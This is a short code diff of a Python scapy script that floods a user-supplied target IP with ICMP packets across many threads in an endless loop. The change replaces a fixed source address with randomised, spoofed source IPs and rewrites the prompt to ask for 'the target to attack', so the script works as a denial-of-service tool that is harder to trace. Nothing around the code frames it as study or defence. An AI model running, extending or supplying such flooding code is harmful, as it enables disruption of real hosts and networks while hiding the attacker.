@@ -5,11 +5,11 @@ import threading
 def icmp (i, ip):
     while True:
         print("Thread: ", i)
-        send(IP(src="192.168.248.110", dst=ip)/ICMP())
+        send(IP(src=RandIP(), dst=ip)/ICMP())
 
 threadList = list()
 
-ip = input("Nhap dia chi nan nhan: ")
+ip = input("Enter the target to attack: ")
 thr = int(input("Threading: "))
 
 for i in range(thr) :
